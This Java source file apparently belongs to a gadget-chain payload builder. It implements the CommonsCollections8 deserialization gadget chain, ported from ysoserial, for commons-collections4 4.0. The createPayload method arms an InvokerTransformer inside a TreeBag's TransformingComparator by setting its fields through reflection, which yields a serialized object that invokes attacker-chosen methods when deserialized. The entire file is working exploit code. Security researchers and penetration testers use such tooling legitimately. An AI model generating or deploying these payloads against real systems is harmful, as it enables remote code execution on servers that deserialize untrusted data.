package org.ses.gadgetbuilder.chains1;

import org.ses.gadgetbuilder.adapters.MethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.ses.gadgetbuilder.util.Reflections;

/**
 * https://github.com/frohoff/ysoserial/blob/newgadgets/src/main/java/ysoserial/payloads/CommonsCollections8.java
 */
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.NAVALORENZO })
@Impact(Impact.MethodInvoke)
public class CommonsCollections8 extends MethodInvokeGadgetChain<NoTrampoline, MethodInvokeAdapter> {
    public CommonsCollections8(NoTrampoline _trampoline, MethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(this.methodInvokeAdapter.getInvocationTarget(command));

        // arm transformer
        Reflections.setFieldValue(transformer, "iMethodName", this.methodInvokeAdapter.getMethodName());
        Reflections.setFieldValue(transformer, "iParamTypes", this.methodInvokeAdapter.getParamTypes());
        Reflections.setFieldValue(transformer, "iArgs", this.methodInvokeAdapter.getParams());

        return new TrampolineConnector(tree);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }
}
